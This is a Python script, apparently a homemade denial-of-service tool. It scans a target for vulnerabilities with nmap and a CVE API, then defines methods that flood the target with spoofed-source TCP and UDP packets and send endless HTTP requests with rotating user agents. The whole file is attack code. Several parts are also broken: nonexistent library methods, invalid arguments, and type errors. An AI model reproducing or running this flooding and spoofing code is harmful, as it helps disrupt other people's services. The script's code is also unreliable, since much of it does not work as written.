from scapy.all import TCP, IP, sr1, conf, Ether, ARP, srp, UDP
import requests
import nmap


dstaddress = input('Destination address: ')
flag = input('Flag: ')
attackprotocol = input('Choose attack protocol: ')
networkaddress = input("In which network are we in? (network id): ")

nm = nmap.PortScanner()
cvssressults = nm.nmap_version_detection(dstaddress, args="--script vulners --script-args mincvss+5.0")
print("cvs results " + cvssressults)


api = "https://api.cvesearch.com/search?q=" + flag
res = requests.get(api)
result = res.json()

print("vulnerabilities associated with that flag: " + result)


class DOS:
    userAgents = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0", 
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00",
                "Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", 
                "Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"]

    def getIpAddresses(self, target_ip):
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
        result = srp(arp_request, timeout=2, iface=None, verbose=False)[0]
        for res in result:
            yield res[1].psrc

    def sendsynstcp(self):
        for ip in self.getIpAddresses("0.0.0.0/0"):
            p = sr1(IP(src=ip, dst=dstaddress)/TCP(flags=flag))
            p.show()


    def sendudp(self,dport):
        for ip in self.getIpAddresses("0.0.0.0/0"):
            p = sr1(IP(src=ip, dst=dstaddress)/UDP(dport))
            p.show()
    
    def applayer(self):
        while True:
            for agent in range(userAgents):
                for ip in self.getIpAddresses("0.0.0.0/0"):
                    result = requests.get(f"http://{dstaddress}", headers={"User-Agent": agent}, source_address=(ip, 0))

dos = DOS()